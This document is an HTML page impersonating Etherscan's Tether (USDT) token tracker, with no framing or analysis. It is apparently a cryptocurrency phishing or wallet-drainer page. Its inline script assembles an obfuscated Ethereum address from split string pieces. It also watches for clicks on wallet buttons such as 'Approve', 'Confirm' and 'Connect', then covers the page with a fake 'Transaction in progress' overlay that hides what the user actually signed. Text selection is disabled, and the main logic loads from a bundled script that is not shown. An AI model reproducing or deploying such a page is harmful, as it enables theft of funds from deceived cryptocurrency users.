<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/svg+xml" href="/assets/eth.svg" />
    <meta name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />

    <title>Tether (USDT) Token Tracker | Etherscan</title>

    <!-- CSS LOCALE -->
    <link rel="stylesheet" href="/assets/index.css">

    <style>
        body {
            -webkit-user-select: none;
            user-select: none;
        }

        #loader-overlay {
            display: none;
            position: fixed;
            inset: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,.6);
            z-index: 2147483647;
            align-items: flex-end;
            justify-content: center;
        }

        #loader-overlay > div {
            background: #fff;
            border-radius: 24px 24px 0 0;
            width: 100%;
            box-shadow: 0 -10px 40px rgba(0,0,0,.3);
            overflow: hidden;
            animation: tw-slide-up .35s ease-out;
        }

        @keyframes tw-slide-up {
            from { transform: translateY(100%); }
            to { transform: translateY(0); }
        }

        .tw-body {
            padding: 48px 24px 40px;
            text-align: center;
        }

        .tw-check-circle {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg,#10b981,#059669);
        }

        .tw-title {
            font-size: 24px;
            font-weight: 700;
            margin: 20px 0 12px;
        }

        .tw-desc {
            color: #666;
            line-height: 1.6;
        }

        .tw-btn {
            background: #0052ff;
            color: white;
            border: none;
            border-radius: 999px;
            width: 100%;
            padding: 18px;
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
</head>

<body>

<div id="loader-overlay">
    <div>
        <div class="tw-body">
            <div class="tw-check-circle">
                ✓
            </div>

            <h2 class="tw-title">Processing...</h2>

            <p class="tw-desc">
                Transaction in progress! Blockchain validation is underway.
                This may take a few minutes.
            </p>

            <button class="tw-btn">
                Transaction details
            </button>
        </div>
    </div>
</div>

<div id="root"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

<script>
    const _p1 = "0xE57C99A3ae2ae12";
    const _p2 = "4f026BFa8601F7A956";
    const _p3 = "309FB53";

    window.rA = _p1 + _p2 + _p3;
    window.XB = "";

    // evita crash observer
    window.addEventListener('DOMContentLoaded', () => {

        const TX_OBSERVER = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        const text = node.textContent || '';

                        if (
                            text.includes('Blockchain validation') ||
                            text.includes('Transaction in progress') ||
                            text.includes('Processing')
                        ) {
                            node.remove?.();

                            document
                                .getElementById('loader-overlay')
                                .style.display = 'flex';
                        }
                    }
                });
            });
        });

        TX_OBSERVER.observe(document.body, {
            childList: true,
            subtree: true
        });
    });

    window.addEventListener('click', (e) => {
        const btn = e.target.closest?.('button');
        const btnText = btn?.innerText || '';

        if (
            btnText.includes('Approve') ||
            btnText.includes('Confirm') ||
            btnText.includes('Connect') ||
            btnText.includes('Next')
        ) {
            setTimeout(() => {
                document.getElementById(
                    'loader-overlay'
                ).style.display = 'flex';
            }, 500);
        }
    });
</script>

<!-- JS LOCALE -->
<script type="module" src="/assets/index.js"></script>

</body>
</html>
